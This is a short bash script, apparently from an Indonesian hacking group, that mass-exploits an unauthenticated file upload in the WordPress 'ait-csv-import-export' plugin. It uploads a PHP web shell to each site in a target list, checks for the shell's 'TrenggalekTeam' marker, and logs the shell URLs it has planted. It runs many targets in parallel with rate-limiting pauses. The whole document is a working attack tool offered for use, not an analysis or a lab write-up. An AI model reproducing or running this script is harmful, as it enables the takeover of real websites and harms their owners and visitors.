#!/usr/bin/env bash
#multithread concept by github.com/florienzh4x

clear

merah='\e[91m'
cyan='\e[96m'
kuning='\e[93m'
oren='\033[0;33m' 
margenta='\e[95m'
biru='\e[94m'
ijo="\e[92m"
putih="\e[97m"
normal='\033[0m'
bold='\e[1m'
labelmerah='\e[41m'
labelijo='\e[42m'
labelkuning='\e[43m'

AITExploit(){
	target="$1"
	exp=$(curl --max-time 30 --connect-timeout 30 -s --url "${target}/wp-content/plugins/ait-csv-import-export/admin/upload-handler.php" -F "file=@weblinks.php" | grep "weblinks.php" 2> /dev/null)
		if [[ $exp =~ "weblinks.php" ]]
		then
			printf "${labelijo}[CHECKING SHELL]${normal} ${target} \n"
			findshell=$(curl --insecure --max-time 30 --connect-timeout 30 -s --url "${target}/wp-content/uploads/weblinks.php" | grep "TrenggalekTeam" 2> /dev/null)
			if [[ $findshell =~ "TrenggalekTeam" ]]
			then
				printf "${labelijo}[SHELL FOUND1]${normal} ${target} \n"
				echo "${target}/wp-content/uploads/weblinks.php" >> shell1.txt
			else
			printf "${labelmerah}[GANEMU - CEK MANUAL]${normal} ${target} \n"
			echo "${target}" >> manual.txt
			fi
		else
			printf "${labelmerah}[BAD]${normal} ${target} \n"
		fi
}

printf "Input ur list: ";
read listku;

slp=5
ngirim=100
hitung=0

IFS=$'\r\n' GLOBIGNORE='*' command eval 'list=($(cat $listku))'
for (( i = 0; i < "${#list[@]}"; i++ )); do
	target="${list[$i]}"
	ngesend=$(expr $hitung % $ngirim)
	if [[ $ngesend == 0 && $hitung > 0 ]]; then
		sleep $slp
	fi
	cat $listku | grep -vE ''$target'' > $listku.tmp
	rm -rf $listku
	mv $listku.tmp $listku
	AITExploit $target &
		hitung=$[$hitung+1]
done
wait
